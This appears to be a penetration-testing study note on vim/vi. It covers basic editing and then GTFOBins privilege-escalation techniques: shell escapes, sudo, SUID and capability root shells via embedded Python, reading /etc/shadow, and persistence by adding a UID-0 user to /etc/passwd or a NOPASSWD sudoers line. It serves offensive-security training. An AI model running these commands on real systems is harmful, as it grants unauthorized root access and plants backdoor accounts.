# Vim / vi

**Tags:** `#vim` `#vi` `#editor` `#gtfobins` `#privesc` `#restrictedshellescape` `#suid` `#sudo`

The near-universal modal text editor on Linux/Unix — `vi` is almost always vim (or the stripped `vim.tiny`/`vim.basic`) under the hood. Two reasons it matters on an engagement: (1) you **have** to edit files on a target and vim's modes trap people, so know the survival subset; (2) it's one of the most reliable **[GTFOBins](https://gtfobins.github.io/gtfobins/vim/)** vectors — a text editor that spawns shells, reads/writes any file, and embeds interpreters, so `sudo`/SUID/capabilities on vim is an instant root.

**Source:** https://www.vim.org · **GTFOBins:** https://gtfobins.github.io/gtfobins/vim/
**Install:** preinstalled almost everywhere (`vim`, `vi`; minimal boxes may only have `vim.tiny`)

```bash
# Escape to a shell from inside vim — the whole privesc story in one line
:!/bin/sh
```

---

## Survival usage (edit a file and get out)

Vim is **modal**: keystrokes mean different things per mode. Press `Esc` any time to get back to Normal mode.

| Mode | Enter it | Purpose |
|---|---|---|
| **Normal** | `Esc` | Navigation + commands (the default) |
| **Insert** | `i` (or `a`, `o`) | Actually type text |
| **Command** | `:` (from Normal) | Save/quit/run `:` commands |

| Goal | Keys |
|---|---|
| Insert text | `i` … type … `Esc` |
| Save | `:w` |
| Save + quit | `:wq` or `:x` or `ZZ` |
| Quit without saving | `:q!` |
| Read another file into buffer | `:r /path/to/file` |
| Open another file | `:e /path/to/file` |
| Undo / redo | `u` / `Ctrl-r` |
| Go to line N / end | `:N` / `G` |

> [!tip] Stuck and just need out? `Esc` then `:q!` (discard) or `:wq` (save). If `Esc` seems dead you're likely already in Normal mode — hit `:` and it should show at the bottom.

---

## Privilege Escalation & Shell Escape (GTFOBins)

### Interactive shell escape (also escapes restricted shells)

From inside vim — works when you're dropped into vim from a restricted `rbash`/menu, or any time vim runs with privilege:

```vim
:!/bin/sh
:!bash
" or set the shell then spawn it:
:set shell=/bin/sh
:shell
```

### sudo → root shell

The classic. If `sudo -l` shows vim/vi (or a wrapper that opens one):

```bash
sudo vim -c ':!/bin/sh'
sudo vi                       # then, inside:  :!/bin/bash
# python-enabled builds (keeps a clean root shell):
sudo vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh")'
```

> [!warning] **A file-restricted sudo rule is still full root.** `(root) NOPASSWD: /usr/bin/vim /var/log/app.log` looks scoped, but once vim is open you can `:e /etc/shadow`, `:w! /etc/passwd`, or `:!/bin/sh` — vim ignores the argument restriction entirely. Any sudo-able editor = root.

### SUID vim

Spawn the shell with `-p` so it keeps the elevated euid (a plain shell drops it):

```bash
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh")'
```

### Capabilities (`cap_setuid+ep`)

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### File read / write with privilege

```vim
" Read a root-only file (sudo/SUID vim)
:r /etc/shadow
" or just:  sudo vim /etc/shadow

" Write to a root-only file → persistence
:w! /etc/passwd
```

**Privileged-file payloads** (same for any write primitive — see [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] for the full set):

```bash
# Add a UID-0 user to /etc/passwd
openssl passwd -1 -salt x Password123        # -> $1$x$....
# then add line:  hacker:$1$x$....:0:0:root:/root:/bin/bash

# Or add a NOPASSWD line to /etc/sudoers
<user> ALL=(ALL) NOPASSWD: ALL
```

> [!note] **Restricted vim** (`rvim`/`rview`, or `vim -Z`) blocks `:!`, `:shell`, and `:suspend`. Escape via an embedded interpreter if compiled in — `:python3`, `:lua`, `:perl`, `:ruby` (e.g. `:py3 import os; os.system("/bin/sh")`). Check `:version` for `+python3/+lua/...`.

---

## Quick Reference

| Goal | Command |
|---|---|
| Shell escape (in vim) | `:!/bin/sh` |
| Escape restricted vim | `:py3 import os; os.system("/bin/sh")` |
| sudo → root | `sudo vim -c ':!/bin/sh'` |
| SUID → root | `./vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh")'` |
| cap_setuid → root | `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'` |
| Read root file | `sudo vim /etc/shadow` or `:r /etc/shadow` |
| Write root file | `:w! /etc/passwd` (add UID-0 user) |
| Just save & quit | `:wq` / discard: `:q!` |

---

> [!note] **See also**
> Sibling editor with the same GTFO story from the other side: [[Tools/Command Shell/nano|nano]].
> Where sudo/SUID/capabilities enumeration and the file-write payloads live: [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] (Sudo Exploitation / SUID / Capabilities).
> Full per-context catalog: [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/) · [vi](https://gtfobins.github.io/gtfobins/vi/).

---

*Created: 2026-08-13*
*Updated: 2026-08-13*
*Model: claude-opus-5*
